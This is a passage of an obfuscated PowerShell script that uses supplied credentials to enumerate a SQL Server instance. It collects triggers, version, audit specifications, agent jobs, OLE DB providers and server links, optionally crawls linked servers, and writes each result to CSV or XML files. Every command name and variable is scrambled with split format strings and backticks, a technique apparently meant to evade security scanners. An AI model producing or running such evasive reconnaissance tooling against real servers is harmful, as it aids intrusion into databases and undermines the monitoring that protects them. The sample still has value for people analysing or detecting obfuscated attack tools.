        ${r`EsU`LtS} = &("{3}{0}{1}{2}" -f 'ge','rDd','l','Get-SQLTrig') -Instance ${IN`S`Ta`NcE} -Username ${us`eRName} -Password ${PASS`wo`RD} -Credential ${c`Re`DE`NTiAL} -SuppressVerbose | &("{0}{1}"-f 'w','here') ("{4}{2}{0}{1}{5}{3}" -f 'e','rDefin','rigg','n','T','itio') -like ("{0}{1}"-f'*##','*')
        if(${X`ml})
        {
            ${o`UTPu`TpA`Th} = "$OutFolder\$OutPutInstance"+("{5}{0}{2}{7}{3}{6}{1}{4}"-f've','tmptbl.xm','r','riggers_ddl_','l','_Ser','global','_t')
            ${rE`S`UlTs} | &("{1}{2}{3}{0}"-f'-Clixml','Ex','po','rt') ${oUtPu`T`PATh}
        }
        else
        {
            ${o`UtPUtPa`TH} = "$OutFolder\$OutPutInstance"+("{0}{2}{3}{4}{8}{1}{5}{7}{6}"-f '_Se','l_glob','rve','r','_trigg','alt','tbl.csv','mp','ers_dd')
            ${r`ESUl`Ts} | &("{0}{1}{2}"-f 'Ex','port-','Csv') -NoTypeInformation ${Ou`TPuT`PA`TH}
        }

        
        &("{0}{1}{2}"-f'Write-V','er','bose') -Message ("$Instance "+'- '+'Get'+'ting '+'se'+'rv'+'er '+'v'+'ers'+'ion '+'inf'+'orma'+'tion'+'...')
        ${RESul`TS} = &("{0}{3}{1}{2}" -f 'Get','v','erInfo','-SQLSer') -Instance ${INst`A`NCe} -Username ${uSerNa`Me} -Password ${PA`sS`word} -Credential ${cr`eDE`NTiAL} -SuppressVerbose
        if(${x`Ml})
        {
            ${O`UtpuTP`A`TH} = "$OutFolder\$OutPutInstance"+("{3}{1}{2}{0}"-f'l','rver_version','.xm','_Se')
            ${res`U`lTs} | &("{0}{2}{1}" -f'Export-','ixml','Cl') ${OutPU`TPa`TH}
        }
        else
        {
            ${oUt`puTPA`TH} = "$OutFolder\$OutPutInstance"+("{3}{0}{1}{4}{2}" -f'_v','ers','on.csv','_Server','i')
            ${rE`sULts} | &("{1}{0}{2}" -f 't-Cs','Expor','v') -NoTypeInformation ${OUT`PU`TpatH}
        }

        
        &("{0}{1}{2}{3}" -f'Wr','i','t','e-Verbose') -Message ("$Instance "+'- '+'Getting'+' '+'Da'+'ta'+'base '+'audi'+'t '+'sp'+'e'+'cif'+'icat'+'ion '+'in'+'formatio'+'n'+'...')
        ${Re`Sul`TS} = &("{0}{4}{3}{2}{1}"-f 'Get-SQLA','Spec','abase','t','uditDa') -Instance ${i`Ns`T`Ance} -Username ${Use`R`NA`me} -Password ${Pas`sW`ORD} -Credential ${C`RE`den`TIal} -SuppressVerbose
        if(${X`ml})
        {
            ${O`UTPut`paTH} = "$OutFolder\$OutPutInstance"+("{0}{1}{5}{3}{2}{4}{10}{6}{9}{8}{7}" -f'_S','erver_','a','D','tabase_','Audit_','p','ifications.xml','c','e','S')
            ${re`Su`LTs} | &("{1}{0}{3}{2}" -f'p','Ex','l','ort-Clixm') ${O`Utp`UtpAth}
        }
        else
        {
            ${O`UtpUtP`ATH} = "$OutFolder\$OutPutInstance"+("{10}{1}{8}{7}{4}{3}{5}{11}{9}{2}{0}{6}"-f 'ions.','er','ficat','ata','t_D','base','csv','_Audi','ver','eci','_S','_Sp')
            ${re`sULtS} | &("{3}{1}{0}{2}" -f'-C','xport','sv','E') -NoTypeInformation ${oU`TpUtp`ATH}
        }

        
        &("{2}{3}{1}{0}"-f 'se','rbo','Wri','te-Ve') -Message ("$Instance "+'- '+'Gettin'+'g'+' '+'Ser'+'ver '+'a'+'ud'+'it '+'s'+'peci'+'ficat'+'ion '+'inf'+'orm'+'a'+'tion.'+'..')
        ${Re`S`ULts} = &("{4}{1}{2}{3}{0}"-f'ec','di','tServer','Sp','Get-SQLAu') -Instance ${iN`sTaN`Ce} -Username ${use`R`Name} -Password ${PAs`s`WORd} -Credential ${cr`ED`E`NtIal} -SuppressVerbose
        if(${x`ml})
        {
            ${OU`TpU`T`PaTh} = "$OutFolder\$OutPutInstance"+("{8}{2}{6}{7}{0}{1}{4}{3}{9}{5}" -f'r','_S','erver_Audit','i','pecificat','xml','__S','erve','_S','ons.')
            ${R`e`sULTS} | &("{0}{3}{1}{2}" -f'Ex','o','rt-Clixml','p') ${O`UtpU`T`PATH}
        }
        else
        {
            ${OUtPU`TP`A`TH} = "$OutFolder\$OutPutInstance"+("{3}{4}{1}{7}{2}{0}{8}{6}{5}"-f 'erv','i','_S','_Serve','r_Aud','ations.csv','ific','t','er_Spec')
            ${rE`S`ULts} | &("{1}{2}{0}"-f'v','Export-C','s') -NoTypeInformation ${ou`T`PUTpatH}
        }

        
        &("{1}{3}{2}{0}{4}" -f 'b','Wri','e-Ver','t','ose') -Message ("$Instance "+'- '+'Ge'+'tti'+'ng '+'Agent'+' '+'Jobs'+'..'+'.')
        ${reS`ULts} = &("{3}{4}{2}{1}{0}"-f'ob','J','Agent','Get-SQ','L') -Instance ${i`NStaN`cE} -Username ${us`erN`A`me} -Password ${pA`SS`w`oRD} -Credential ${C`RE`DeNTiAl} -SuppressVerbose
        if(${X`ml})
        {
            ${oUTp`UTPA`Th} = "$OutFolder\$OutPutInstance"+("{4}{3}{1}{6}{0}{2}{5}" -f 'b','agen','.xm','er_','_Serv','l','t_jo')
            ${re`S`UlTs} | &("{1}{0}{2}" -f'-Clixm','Export','l') ${O`UTPUt`PATH}
        }
        else
        {
            ${o`UtPUT`pa`Th} = "$OutFolder\$OutPutInstance"+("{1}{4}{5}{2}{0}{6}{3}"-f'ent','_','g','jobs.csv','Server','_a','_')
            ${REsul`TS} | &("{3}{2}{1}{0}"-f'-Csv','rt','po','Ex') -NoTypeInformation ${oU`TPUTp`A`TH}
        }

        
        &("{2}{1}{3}{0}"-f 'Verbose','rite','W','-') -Message ("$Instance "+'- '+'Gett'+'ing '+'Agen'+'t '+'Job'+'s '+'that'+' '+'u'+'se '+'glo'+'b'+'al '+'temp'+' '+'tabl'+'e'+'s...')
        ${R`eS`ULTS} = &("{3}{2}{1}{0}" -f'ob','tJ','et-SQLAgen','G') -Instance ${ins`Ta`Nce} -Username ${use`RName} -Password ${pAs`S`wOrd} -Credential ${CRED`e`NtIal} -SuppressVerbose -Keyword "##"
        if(${X`ml})
        {
            ${Ou`T`pu`TpatH} = "$OutFolder\$OutPutInstance"+("{3}{4}{5}{7}{2}{0}{8}{9}{1}{6}"-f 'ob_g','altmptbl.x','nt_j','_Se','rver','_a','ml','ge','l','ob')
            ${rES`UL`Ts} | &("{1}{2}{0}" -f'l','Export-Cl','ixm') ${O`Ut`puTpa`TH}
        }
        else
        {
            ${oUTPu`Tp`ATh} = "$OutFolder\$OutPutInstance"+("{6}{0}{1}{3}{5}{4}{2}"-f'er','_agen','tbl.csv','t_jobs_glo','tmp','bal','_Serv')
            ${r`e`sULTs} | &("{2}{1}{0}"-f '-Csv','rt','Expo') -NoTypeInformation ${OuTPu`TP`Ath}
        }

        
        &("{0}{1}{2}"-f 'Wri','te','-Verbose') -Message ("$Instance "+'- '+'Ge'+'tting'+' '+'O'+'LE '+'D'+'B '+'pro'+'vd'+'er '+'in'+'fo'+'r'+'mation...')
        ${rE`sU`lts} = &("{3}{4}{2}{1}{0}{5}"-f'o','bPr','D','Get','-SQLOle','vder') -Instance ${I`NsT`AncE} -Username ${u`S`ERnamE} -Password ${p`As`SWord} -Credential ${C`RedeN`TIAl} -SuppressVerbose
        if(${X`mL})
        {
            ${Out`pU`TP`Ath} = "$OutFolder\$OutPutInstance"+("{1}{0}{5}{6}{2}{3}{4}"-f 'erv','_S','r','ovider','s.xml','er_o','ledbp')
            ${r`e`Sults} | &("{0}{1}{2}"-f 'Ex','p','ort-Clixml') ${Ou`TpuT`PaTH}
        }
        else
        {
            ${OuTpU`T`paTH} = "$OutFolder\$OutPutInstance"+("{4}{1}{0}{2}{3}"-f 'er_ol','v','edbprov','iders.csv','_Ser')
            ${R`EsU`LtS} | &("{3}{2}{0}{1}"-f '-Cs','v','t','Expor') -NoTypeInformation ${OuT`P`Ut`paTh}
        } 
        
        
        &("{1}{0}{2}" -f'r','W','ite-Verbose') -Message ("$Instance "+'- '+'Ge'+'tt'+'ing '+'serv'+'er '+'l'+'in'+'ks...')
        ${RE`sU`lTs} = &("{1}{0}{3}{2}" -f'er','Get-SQLS','Link','ver') -Instance ${In`stan`ce} -Username ${Us`e`RNAme} -Password ${p`Assw`ORd} -Credential ${c`ReDe`NtI`Al} -SuppressVerbose
        if(${x`ML})
        {
            ${oUtpU`T`P`ATH} = "$OutFolder\$OutPutInstance"+("{1}{3}{5}{2}{4}{0}" -f'xml','_S','s','erver_lin','.','k')
            ${res`ULts} | &("{0}{2}{3}{1}" -f 'E','ixml','xp','ort-Cl') ${O`UtP`U`TpaTH}
        }
        else
        {
            ${oU`TPUTP`A`TH} = "$OutFolder\$OutPutInstance"+("{1}{3}{2}{0}" -f'ks.csv','_','n','Server_li')
            ${reS`Ults} | &("{1}{3}{2}{0}" -f'ort-Csv','E','p','x') -NoTypeInformation ${ou`TPUTP`Ath}
        }

        
        if(${CR`AwLlIN`Ks}){
            &("{3}{2}{0}{1}"-f'V','erbose','ite-','Wr') -Message ("$Instance "+'- '+'Crawling'+' '+'link'+'ed '+'server'+'s.'+'..')
            ${RE`s`UltS} = &("{6}{0}{5}{3}{2}{1}{4}"-f 'SQ','rLinkC','rve','e','rawl','LS','Get-') -Instance ${i`NsTAn`Ce} -Username ${US`eR`NAmE} -Password ${P`Ass`WORd} -Credential ${c`R`edeNti`AL} -Export2
            if(${x`Ml})
            {
                ${ouT`p`UTP`Ath} = "$OutFolder\$OutPutInstance"+("{0}{4}{1}{2}{3}{5}"-f '_','_lin','ks_c','rawl.xm','Server','l')
                ${rES`Ul`Ts} | &("{2}{0}{1}{3}" -f'ort-Cl','i','Exp','xml') ${ou`TP`UTP`Ath}
            }
            else
            {
                ${Out`PU`TPATH} = "$OutFolder\$OutPutInstance"+("{0}{4}{1}{3}{2}" -f '_Server_','i','l.csv','nks_craw','l')
                ${Re`SuLTS} | &("{1}{0}{2}{3}"-f 'r','Expo','t-Cs','v') -NoTypeInformation ${O`UtpU`T`patH}
            }
        }               

        &("{0}{2}{1}{3}" -f'Write-','rbos','Ve','e') -Message ("$Instance "+'- '+'EN'+'D')
    }
    End
    {
    }
}


